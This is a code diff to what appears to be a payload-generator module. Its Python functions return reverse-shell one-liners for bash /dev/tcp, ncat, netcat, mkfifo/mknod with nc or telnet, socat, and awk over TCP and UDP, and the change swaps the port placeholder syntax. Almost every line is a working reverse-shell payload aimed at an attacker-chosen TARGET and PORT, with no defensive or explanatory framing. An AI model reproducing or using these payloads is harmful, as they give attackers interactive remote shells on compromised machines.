@@ -32,7 +32,7 @@ def REV_PERL_UDP():
 
 
 def BASH_TCP():
-    return """/bin/bash -i >& /dev/tcp/TARGET/$((PORT)) 0>&1"""
+    return """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""
 
 
 def REV_POWERSHELL_TCP():
@@ -44,43 +44,43 @@ def REVERSE_TCLSH():
 
 
 def REVERSE_NCAT():
-    return "ncat TARGET $((PORT)) -e /bin/bash"
+    return "ncat TARGET PORT -e /bin/bash"
 
 
 def REVERSE_NC_TRADITIONAL_1():
-    return "nc TARGET $((PORT)) -c /bin/bash"
+    return "nc TARGET PORT -c /bin/bash"
 
 
 def REVERSE_NC_UDP_1():
-    return """mkfifo fifo ; nc.traditional -u TARGET $((PORT)) < fifo | { bash -i; } > fifo"""
+    return """mkfifo fifo ; nc.traditional -u TARGET PORT < fifo | { bash -i; } > fifo"""
 
 
 def REVERSE_MKFIFO_NC():
-    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc TARGET $((PORT)) > /tmp/VAR1"
+    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc TARGET PORT > /tmp/VAR1"
 
 
 def REVERSE_MKNOD_NC():
-    return "if [ -e /tmp/VAR1 ];then rm -f /tmp/VAR1;fi;mknod /tmp/VAR1 p && nc TARGET $((PORT)) 0</tmp/VAR1|/bin/bash 1>/tmp/VAR1"
+    return "if [ -e /tmp/VAR1 ];then rm -f /tmp/VAR1;fi;mknod /tmp/VAR1 p && nc TARGET PORT 0</tmp/VAR1|/bin/bash 1>/tmp/VAR1"
 
 
 def REVERSE_MKFIFO_TELNET():
-    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|telnet TARGET $((PORT)) > /tmp/VAR1"
+    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|telnet TARGET PORT > /tmp/VAR1"
 
 
 def REVERSE_MKNOD_TELNET():
-    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mknod /tmp/VAR1 p && telnet TARGET $((PORT)) 0</tmp/VAR1|/bin/bash 1>/tmp/VAR1"
+    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mknod /tmp/VAR1 p && telnet TARGET PORT 0</tmp/VAR1|/bin/bash 1>/tmp/VAR1"
 
 
 def REVERSE_SOCAT():
-    return """socat tcp-connect:TARGET:$((PORT)) exec:"bash -li",pty,stderr,setsid,sigint,sane"""
+    return """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""
 
 
 def REVERSE_AWK():
-    return """VAR1=$((PORT));awk -v VAR2="$VAR1" 'BEGIN{VAR3="/inet/tcp/0/TARGET/"VAR2;while(NUM1){do{printf "shell>"|&VAR3;VAR3|& getline VAR4;if(VAR4){while((VAR4|& getline)>0)print $0|&VAR3;close(VAR4);}}while(VAR4!="exit")close(VAR3);break}}' /dev/null"""
+    return """VAR1=PORT;awk -v VAR2="$VAR1" 'BEGIN{VAR3="/inet/tcp/0/TARGET/"VAR2;while(NUM1){do{printf "shell>"|&VAR3;VAR3|& getline VAR4;if(VAR4){while((VAR4|& getline)>0)print $0|&VAR3;close(VAR4);}}while(VAR4!="exit")close(VAR3);break}}' /dev/null"""
 
 
 def REVERSE_AWK_UDP():
-    return """VAR1=$((PORT));awk -v VAR2="$VAR1" 'BEGIN{VAR3="/inet/udp/0/TARGET/"VAR2;while(NUM1){do{printf "shell>"|&VAR3;VAR3|& getline VAR4;if(VAR4){while((VAR4|& getline)>0)print $0|&VAR3;close(VAR4);}}while(VAR4!="exit")close(VAR3);break}}' /dev/null"""
+    return """VAR1=PORT;awk -v VAR2="$VAR1" 'BEGIN{VAR3="/inet/udp/0/TARGET/"VAR2;while(NUM1){do{printf "shell>"|&VAR3;VAR3|& getline VAR4;if(VAR4){while((VAR4|& getline)>0)print $0|&VAR3;close(VAR4);}}while(VAR4!="exit")close(VAR3);break}}' /dev/null"""
 
 
 def REVERSE_WINDOWS_BAT2METERPRETER_TCP():
